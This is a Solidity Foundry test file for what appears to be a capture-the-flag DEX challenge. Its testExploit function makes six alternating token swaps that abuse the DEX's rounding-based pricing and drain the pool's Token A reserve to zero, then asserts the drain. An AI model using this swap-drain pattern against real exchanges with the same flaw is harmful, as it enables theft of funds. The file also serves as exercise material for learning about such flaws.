// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }

    
    function testExploit() public {
    vm.startPrank(attacker);

    // Approve Dex to spend attacker's tokens
    dex.approve(address(dex), type(uint256).max);

    console.log("Initial Dex Token A balance:", swappabletokenA.balanceOf(address(dex)));
    
    // Exploit steps
    dex.swap(address(swappabletokenA), address(swappabletokenB), 10);  // Swap 10 A -> B
    dex.swap(address(swappabletokenB), address(swappabletokenA), 20);  // Swap 20 B -> A
    dex.swap(address(swappabletokenA), address(swappabletokenB), 24);  // Swap 24 A -> B
    dex.swap(address(swappabletokenB), address(swappabletokenA), 30);  // Swap 30 B -> A
    dex.swap(address(swappabletokenA), address(swappabletokenB), 41);  // Swap 41 A -> B
    dex.swap(address(swappabletokenB), address(swappabletokenA), 45);  // Final swap to drain A

    console.log("Final Dex Token A balance:", swappabletokenA.balanceOf(address(dex)));
    
    // Verify all Token A reserves are drained
    assertEq(swappabletokenA.balanceOf(address(dex)), 0, "Token A reserves not drained");

    vm.stopPrank();
}

}
